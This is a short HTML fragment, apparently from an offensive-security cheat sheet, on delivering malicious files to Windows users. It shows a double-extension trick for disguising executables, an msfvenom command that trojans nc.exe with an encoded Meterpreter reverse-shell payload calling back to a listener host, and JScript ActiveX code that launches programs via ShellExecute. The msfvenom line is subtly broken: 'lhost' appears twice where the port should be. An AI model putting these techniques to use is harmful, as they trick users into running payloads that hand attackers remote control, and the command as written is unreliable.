</head><body><b>Change the filename</b><br/>
Since windows by default remove the filename you can call your file shell.jpg.exe, and once downloaded onto the machine windows will display it as "shell.jpg".<br/>
<br/>
<b>Embed malicious code in legitimate file</b><br/>
It is however very likely that this will be picked up by a antivirus.<br/>
msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ncMalicious.exe<br/>
<br/>
<b>Autodownload a malicious javascript-file</b><br/>
Just like we can download an exe for a user to can also make that user download a javascript file. Since javascript files can execute commands on windows.<br/>
<br/>
var oShell = new ActiveXObject("Shell.Application");<br/>
var commandtoRun = "C:\\Windows\\system32\\calc.exe";<br/>
oShell.ShellExecute(commandtoRun,"","","open","1");<br/>
